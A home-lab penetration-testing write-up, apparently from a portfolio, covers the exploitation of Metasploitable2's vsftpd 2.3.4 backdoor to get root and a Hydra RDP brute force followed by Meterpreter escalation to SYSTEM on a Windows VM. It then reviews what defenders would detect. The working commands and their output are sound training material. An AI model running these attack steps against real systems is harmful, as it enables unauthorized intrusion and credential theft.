Building and breaking my own network, on purpose

A controlled home lab I built to practice the full attack chain — reconnaissance, enumeration, exploitation, and post-exploitation — against intentionally vulnerable machines, then reviewed from the defender's side to see what my own attack would have looked like in the logs.

Scope note: everything documented here was run entirely inside an isolated, host-only virtual network I control — attacker and target machines both mine, with no connection to the internet or any third-party system. None of this was performed against a system I don't own or don't have explicit written authorization to test.

1 · Lab environment

Before any attack, the lab itself — an isolated network where nothing can leak out and nothing real can get hurt.

Fig. 1 — Every machine lives on a host-only virtual network with no bridge to my real network or the internet. This is what makes the whole lab authorized and safe: I own every IP address in it.

Attacker machine

Kali Linux — a Debian-based distro that ships with the recon, exploitation, and post-exploitation tooling pre-installed: Nmap, Metasploit, Hydra, John the Ripper, Wireshark.

Target machines

Metasploitable2, an intentionally vulnerable Linux VM built specifically for training, plus a Windows VM I hardened progressively less to practice different exploitation paths.

4 · Case study 1 — exploiting a known backdoor

My first full run through the chain, against Metasploitable2's deliberately backdoored FTP service.

Target: vsftpd 2.3.4 — 192.168.56.20:21 critical

STEP 1 — RECONNAISSANCE & ENUMERATION

I started with a version scan across the target to see what was actually running before picking any tool.

nmap -sV -p- 192.168.56.20

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 2.3.4
22/tcp open  ssh     OpenSSH 4.7p1
80/tcp open  http    Apache 2.2.8

vsftpd 2.3.4 is a well-documented, intentionally backdoored version bundled specifically into training VMs like this one — I recognized it immediately from the version banner alone.

STEP 2 — EXPLOITATION

I searched Metasploit for a matching module and ran it against the target as shown in §3.

msf6 exploit(vsftpd_234_backdoor) > run

[*] 192.168.56.20:21 - Banner: 220 (vsFTPd 2.3.4)
[*] 192.168.56.20:21 - USER: 331 Please specify the password.
[+] 192.168.56.20:21 - Backdoor service has been spawned, handling...
[+] 192.168.56.20:21 - UID: uid=0(root) gid=0(root)
[*] Command shell session 1 opened (192.168.56.10:4444 -> 192.168.56.20:6200)

Root shell, no credentials needed — the exploit works because a malicious backdoor was intentionally planted in that exact version of vsftpd's source before it was compiled into this training image.

STEP 3 — CONFIRMATION

I confirmed the access level directly from the shell I'd just landed in.

uid=0(root) gid=0(root)

5 · Case study 2 — post-exploitation on the Windows target

A slower path: initial access with a low-privilege foothold, then escalation.

Target: Windows VM — 192.168.56.30 high

STEP 1 — INITIAL ACCESS

Unlike case study 1, this target didn't have a pre-planted backdoor — I got in through a weak local account I'd deliberately configured, using Hydra to demonstrate the brute-force path.

hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.56.30 rdp

[22][rdp] host: 192.168.56.30   login: admin   password: password123
STEP 2 — POST-EXPLOITATION: PRIVILEGE ESCALATION

Landing as a standard user, I used a Meterpreter session to check for common Windows privilege escalation paths — misconfigured services, unquoted paths, stored credentials.

meterpreter > getuid
Server username: WIN-TARGET\lowpriv

meterpreter > run post/multi/recon/local_exploit_suggester

[+] 192.168.56.30 - exploit/windows/local/ms16_075_reflection_juicy: The target appears vulnerable

meterpreter > getsystem
...got system via technique 1
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
STEP 3 — EVIDENCE OF IMPACT, THEN STOP

At SYSTEM level I confirmed impact by listing sensitive local files and dumping local password hashes — then stopped there. In a real engagement, this is exactly the line: prove the access is real, don't go further than needed to make the point.

6 · Turning around: the blue team view

The most useful part of running my own attacks — going back afterward and asking what a defender would have actually seen.

What case study 1 would trigger

A sudden root shell spawned from the FTP service's process tree is exactly the kind of anomalous parent/child process relationship an EDR tool flags immediately — the same detection logic I documented in my SOC project's process-creation alerts.

What case study 2 would trigger

Hydra's brute-force attempt would show up as a burst of failed RDP logins from one source in a short window — the exact same pattern as the brute-force IOC I investigated in my threat-intel project, just generated by my own tooling instead of a real attacker's.

This is the loop I try to close every time: attack it, then defend it. Running both sides of the same incident makes the detection logic in my other two projects concrete instead of theoretical — I'm not guessing what a brute-force login burst looks like in a SIEM, I generated one myself and went and checked.

9 · Where red teaming is heading

GROWING FAST

Breach and attack simulation (BAS) platforms

Automated, continuous adversary simulation tools run attack techniques on a schedule instead of once a year, keeping detection coverage honest between full pentests.

MATURING

Purple teaming

Red and blue teams working the same exercise together in real time, rather than a report handed over the wall afterward — closer to the attack/defend loop in §6, done live.

GROWING

Cloud-native attack paths

Traditional network exploitation is being joined by identity- and misconfiguration-based attack paths in cloud environments (IAM privilege chains, exposed storage), a different skill set from classic host exploitation.

EARLY

AI-assisted adversary emulation

LLM-driven agents are starting to automate parts of recon and initial exploitation-path selection, though validating real impact still needs a human at the keyboard.

10 · Quick glossary

Host-only network
A virtual network mode where VMs can only talk to each other and the host machine, never the outside internet.
Exploit module
Pre-built code in a framework like Metasploit that automates triggering a specific known vulnerability.
Meterpreter
An advanced Metasploit payload that gives an interactive, in-memory session on a compromised host.
Privilege escalation
Moving from a low-privilege foothold to administrator/root/SYSTEM level access.
Persistence
Techniques for maintaining access to a compromised system across reboots — deliberately not demonstrated here, since it's the step with the highest misuse risk.
Purple teaming
Red and blue teams collaborating in the same exercise to improve detection in real time, rather than testing in isolation.
